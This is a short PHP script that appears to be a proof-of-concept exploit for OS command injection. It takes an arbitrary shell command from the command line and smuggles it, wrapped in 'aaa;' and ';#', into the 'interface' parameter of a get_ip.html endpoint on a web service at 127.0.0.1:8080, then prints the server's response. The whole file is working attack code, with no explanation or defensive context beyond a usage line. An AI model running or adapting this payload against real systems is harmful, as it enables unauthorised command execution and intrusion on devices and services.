<?php

if (count($argv) < 2){
	echo "Usage: php $argv[0] \"cmd to inject\"\n";
	die();
}

$url = "127.0.0.1:8080/get_ip.html?interface=";
$cmd = $argv[1];
$cmd = str_replace(" ", "%20", $cmd); // use %20 for space in cmd line
$cmd = urlencode("aaa;").$cmd.urlencode(";#"); 
$full = $url.$cmd;
//echo $full."\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $full);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$resp = curl_exec($ch);
echo $resp."\n";
curl_close($ch);
?>